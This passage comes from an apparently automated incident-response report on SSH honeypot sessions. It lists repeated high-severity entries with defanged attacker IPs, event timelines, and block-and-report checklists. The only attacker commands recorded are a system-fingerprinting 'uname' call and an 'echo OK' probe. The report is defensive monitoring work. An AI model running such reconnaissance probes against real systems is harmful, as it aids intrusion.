- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3874467e89b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:35` | `cowrie.session.connect` |
| `2026-07-04 18:55:35` | `cowrie.client.version` |
| `2026-07-04 18:55:35` | `cowrie.client.kex` |
| `2026-07-04 18:55:36` | `cowrie.login.success` |
| `2026-07-04 18:55:37` | `cowrie.session.params` |
| `2026-07-04 18:55:37` | `cowrie.command.input` |
| `2026-07-04 18:55:37` | `cowrie.log.closed` |
| `2026-07-04 18:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08310e070905

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:41` | `cowrie.session.connect` |
| `2026-07-04 18:55:41` | `cowrie.client.version` |
| `2026-07-04 18:55:41` | `cowrie.client.kex` |
| `2026-07-04 18:55:42` | `cowrie.login.success` |
| `2026-07-04 18:55:43` | `cowrie.session.params` |
| `2026-07-04 18:55:43` | `cowrie.command.input` |
| `2026-07-04 18:55:43` | `cowrie.log.closed` |
| `2026-07-04 18:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f4551aa25a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:46` | `cowrie.session.connect` |
| `2026-07-04 18:55:46` | `cowrie.client.version` |
| `2026-07-04 18:55:47` | `cowrie.client.kex` |
| `2026-07-04 18:55:47` | `cowrie.login.success` |
| `2026-07-04 18:55:48` | `cowrie.session.params` |
| `2026-07-04 18:55:48` | `cowrie.command.input` |
| `2026-07-04 18:55:48` | `cowrie.log.closed` |
| `2026-07-04 18:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918dddc8cf0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:52` | `cowrie.session.connect` |
| `2026-07-04 18:55:52` | `cowrie.client.version` |
| `2026-07-04 18:55:52` | `cowrie.client.kex` |
| `2026-07-04 18:55:53` | `cowrie.login.success` |
| `2026-07-04 18:55:54` | `cowrie.session.params` |
| `2026-07-04 18:55:54` | `cowrie.command.input` |
| `2026-07-04 18:55:54` | `cowrie.log.closed` |
| `2026-07-04 18:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209a0072efcc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:55 |
| **Last Seen** | 2026-07-04 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:55:58` | `cowrie.session.connect` |
| `2026-07-04 18:55:58` | `cowrie.client.version` |
| `2026-07-04 18:55:58` | `cowrie.client.kex` |
| `2026-07-04 18:55:58` | `cowrie.login.success` |
| `2026-07-04 18:55:59` | `cowrie.session.params` |
| `2026-07-04 18:55:59` | `cowrie.command.input` |
| `2026-07-04 18:55:59` | `cowrie.log.closed` |
| `2026-07-04 18:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf237a71b09d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:03` | `cowrie.session.connect` |
| `2026-07-04 18:56:03` | `cowrie.client.version` |
| `2026-07-04 18:56:03` | `cowrie.client.kex` |
| `2026-07-04 18:56:04` | `cowrie.login.success` |
| `2026-07-04 18:56:05` | `cowrie.session.params` |
| `2026-07-04 18:56:05` | `cowrie.command.input` |
| `2026-07-04 18:56:05` | `cowrie.log.closed` |
| `2026-07-04 18:56:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4249c64eef32

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:06` | `cowrie.session.connect` |
| `2026-07-04 18:56:06` | `cowrie.client.version` |
| `2026-07-04 18:56:06` | `cowrie.client.kex` |
| `2026-07-04 18:56:06` | `cowrie.login.success` |
| `2026-07-04 18:56:07` | `cowrie.session.params` |
| `2026-07-04 18:56:07` | `cowrie.command.input` |
| `2026-07-04 18:56:07` | `cowrie.log.closed` |
| `2026-07-04 18:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5024fd642b4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:08` | `cowrie.session.connect` |
| `2026-07-04 18:56:09` | `cowrie.client.version` |
| `2026-07-04 18:56:09` | `cowrie.client.kex` |
| `2026-07-04 18:56:10` | `cowrie.login.success` |
| `2026-07-04 18:56:11` | `cowrie.session.params` |
| `2026-07-04 18:56:11` | `cowrie.command.input` |
| `2026-07-04 18:56:11` | `cowrie.log.closed` |
| `2026-07-04 18:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0fd83134173

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:14` | `cowrie.session.connect` |
| `2026-07-04 18:56:14` | `cowrie.client.version` |
| `2026-07-04 18:56:14` | `cowrie.client.kex` |
| `2026-07-04 18:56:14` | `cowrie.login.success` |
| `2026-07-04 18:56:15` | `cowrie.session.params` |
| `2026-07-04 18:56:15` | `cowrie.command.input` |
| `2026-07-04 18:56:15` | `cowrie.log.closed` |
| `2026-07-04 18:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373ac8677c82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:20` | `cowrie.session.connect` |
| `2026-07-04 18:56:20` | `cowrie.client.version` |
| `2026-07-04 18:56:20` | `cowrie.client.kex` |
| `2026-07-04 18:56:20` | `cowrie.login.success` |
| `2026-07-04 18:56:21` | `cowrie.session.params` |
| `2026-07-04 18:56:21` | `cowrie.command.input` |
| `2026-07-04 18:56:21` | `cowrie.log.closed` |
| `2026-07-04 18:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c852f8a97c47

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:25` | `cowrie.session.connect` |
| `2026-07-04 18:56:25` | `cowrie.client.version` |
| `2026-07-04 18:56:25` | `cowrie.client.kex` |
| `2026-07-04 18:56:26` | `cowrie.login.success` |
| `2026-07-04 18:56:27` | `cowrie.session.params` |
| `2026-07-04 18:56:27` | `cowrie.command.input` |
| `2026-07-04 18:56:27` | `cowrie.log.closed` |
| `2026-07-04 18:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38aca2bea047

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:31` | `cowrie.session.connect` |
| `2026-07-04 18:56:31` | `cowrie.client.version` |
| `2026-07-04 18:56:31` | `cowrie.client.kex` |
| `2026-07-04 18:56:31` | `cowrie.login.success` |
| `2026-07-04 18:56:32` | `cowrie.session.params` |
| `2026-07-04 18:56:32` | `cowrie.command.input` |
| `2026-07-04 18:56:32` | `cowrie.log.closed` |
| `2026-07-04 18:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a513deb0cda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:36` | `cowrie.session.connect` |
| `2026-07-04 18:56:36` | `cowrie.client.version` |
| `2026-07-04 18:56:36` | `cowrie.client.kex` |
| `2026-07-04 18:56:37` | `cowrie.login.success` |
| `2026-07-04 18:56:38` | `cowrie.session.params` |
| `2026-07-04 18:56:38` | `cowrie.command.input` |
| `2026-07-04 18:56:39` | `cowrie.log.closed` |
| `2026-07-04 18:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b5bfaa09814

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:41` | `cowrie.session.connect` |
| `2026-07-04 18:56:42` | `cowrie.client.version` |
| `2026-07-04 18:56:42` | `cowrie.client.kex` |
| `2026-07-04 18:56:42` | `cowrie.login.success` |
| `2026-07-04 18:56:43` | `cowrie.session.params` |
| `2026-07-04 18:56:43` | `cowrie.command.input` |
| `2026-07-04 18:56:43` | `cowrie.log.closed` |
| `2026-07-04 18:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318cec88b365

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:47` | `cowrie.session.connect` |
| `2026-07-04 18:56:47` | `cowrie.client.version` |
| `2026-07-04 18:56:47` | `cowrie.client.kex` |
| `2026-07-04 18:56:48` | `cowrie.login.success` |
| `2026-07-04 18:56:49` | `cowrie.session.params` |
| `2026-07-04 18:56:49` | `cowrie.command.input` |
| `2026-07-04 18:56:49` | `cowrie.log.closed` |
| `2026-07-04 18:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96d6c991126

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:52` | `cowrie.session.connect` |
| `2026-07-04 18:56:52` | `cowrie.client.version` |
| `2026-07-04 18:56:53` | `cowrie.client.kex` |
| `2026-07-04 18:56:53` | `cowrie.login.success` |
| `2026-07-04 18:56:54` | `cowrie.session.params` |
| `2026-07-04 18:56:54` | `cowrie.command.input` |
| `2026-07-04 18:56:54` | `cowrie.log.closed` |
| `2026-07-04 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bcf620036d8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:56 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:56:58` | `cowrie.session.connect` |
| `2026-07-04 18:56:58` | `cowrie.client.version` |
| `2026-07-04 18:56:58` | `cowrie.client.kex` |
| `2026-07-04 18:56:59` | `cowrie.login.success` |
| `2026-07-04 18:56:59` | `cowrie.session.params` |
| `2026-07-04 18:56:59` | `cowrie.command.input` |
| `2026-07-04 18:57:00` | `cowrie.log.closed` |
| `2026-07-04 18:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6bd03b7cc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:03` | `cowrie.session.connect` |
| `2026-07-04 18:57:04` | `cowrie.client.version` |
| `2026-07-04 18:57:04` | `cowrie.client.kex` |
| `2026-07-04 18:57:04` | `cowrie.login.success` |
| `2026-07-04 18:57:05` | `cowrie.session.params` |
| `2026-07-04 18:57:05` | `cowrie.command.input` |
| `2026-07-04 18:57:06` | `cowrie.log.closed` |
| `2026-07-04 18:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f506aecaf8d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:09` | `cowrie.session.connect` |
| `2026-07-04 18:57:09` | `cowrie.client.version` |
| `2026-07-04 18:57:09` | `cowrie.client.kex` |
| `2026-07-04 18:57:10` | `cowrie.login.success` |
| `2026-07-04 18:57:11` | `cowrie.session.params` |
| `2026-07-04 18:57:11` | `cowrie.command.input` |
| `2026-07-04 18:57:11` | `cowrie.log.closed` |
| `2026-07-04 18:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd17f2c4485

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:15` | `cowrie.session.connect` |
| `2026-07-04 18:57:15` | `cowrie.client.version` |
| `2026-07-04 18:57:15` | `cowrie.client.kex` |
| `2026-07-04 18:57:16` | `cowrie.login.success` |
| `2026-07-04 18:57:16` | `cowrie.session.params` |
| `2026-07-04 18:57:16` | `cowrie.command.input` |
| `2026-07-04 18:57:16` | `cowrie.log.closed` |
| `2026-07-04 18:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ff6f5ab0522

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:20` | `cowrie.session.connect` |
| `2026-07-04 18:57:20` | `cowrie.client.version` |
| `2026-07-04 18:57:20` | `cowrie.client.kex` |
| `2026-07-04 18:57:21` | `cowrie.login.success` |
| `2026-07-04 18:57:22` | `cowrie.session.params` |
| `2026-07-04 18:57:22` | `cowrie.command.input` |
| `2026-07-04 18:57:22` | `cowrie.log.closed` |
| `2026-07-04 18:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55fa57ca7bc3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:26` | `cowrie.session.connect` |
| `2026-07-04 18:57:26` | `cowrie.client.version` |
| `2026-07-04 18:57:26` | `cowrie.client.kex` |
| `2026-07-04 18:57:27` | `cowrie.login.success` |
| `2026-07-04 18:57:28` | `cowrie.session.params` |
| `2026-07-04 18:57:28` | `cowrie.command.input` |
| `2026-07-04 18:57:28` | `cowrie.log.closed` |
| `2026-07-04 18:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb7a3816b53

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:31` | `cowrie.session.connect` |
| `2026-07-04 18:57:31` | `cowrie.client.version` |
| `2026-07-04 18:57:31` | `cowrie.client.kex` |
| `2026-07-04 18:57:32` | `cowrie.login.success` |
| `2026-07-04 18:57:33` | `cowrie.session.params` |
| `2026-07-04 18:57:33` | `cowrie.command.input` |
| `2026-07-04 18:57:34` | `cowrie.log.closed` |
| `2026-07-04 18:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c262ae3c73ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:37` | `cowrie.session.connect` |
| `2026-07-04 18:57:37` | `cowrie.client.version` |
| `2026-07-04 18:57:37` | `cowrie.client.kex` |
| `2026-07-04 18:57:38` | `cowrie.login.success` |
| `2026-07-04 18:57:39` | `cowrie.session.params` |
| `2026-07-04 18:57:39` | `cowrie.command.input` |
| `2026-07-04 18:57:39` | `cowrie.log.closed` |
| `2026-07-04 18:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3ee84f5678

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:42` | `cowrie.session.connect` |
| `2026-07-04 18:57:42` | `cowrie.client.version` |
| `2026-07-04 18:57:42` | `cowrie.client.kex` |
| `2026-07-04 18:57:43` | `cowrie.login.success` |
| `2026-07-04 18:57:44` | `cowrie.session.params` |
| `2026-07-04 18:57:44` | `cowrie.command.input` |
| `2026-07-04 18:57:44` | `cowrie.log.closed` |
| `2026-07-04 18:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285a4b43ecad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:48` | `cowrie.session.connect` |
| `2026-07-04 18:57:48` | `cowrie.client.version` |
| `2026-07-04 18:57:48` | `cowrie.client.kex` |
| `2026-07-04 18:57:49` | `cowrie.login.success` |
| `2026-07-04 18:57:50` | `cowrie.session.params` |
